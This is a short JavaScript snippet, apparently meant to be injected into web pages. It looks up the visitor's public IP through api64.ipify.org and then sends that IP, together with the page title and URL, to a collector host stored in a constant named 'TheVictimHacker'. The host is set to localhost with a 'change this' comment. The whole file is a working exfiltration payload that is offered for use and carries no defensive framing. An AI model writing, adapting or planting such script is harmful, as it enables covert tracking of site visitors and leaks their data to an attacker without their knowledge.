console.log('Fetcher included! :)')
const TheVictimHacker = 'http://localhost:8080' // change this
function victimIPGET () {
  const xmlHttp = new XMLHttpRequest()
  xmlHttp.open('GET', 'https://api64.ipify.org', false) // false for synchronous request
  xmlHttp.send(null)
  return xmlHttp.responseText
}
const victimIP = victimIPGET()
console.log(victimIP)

fetch(`${TheVictimHacker}/${victimIP}&${document.title}&${window.location}`)
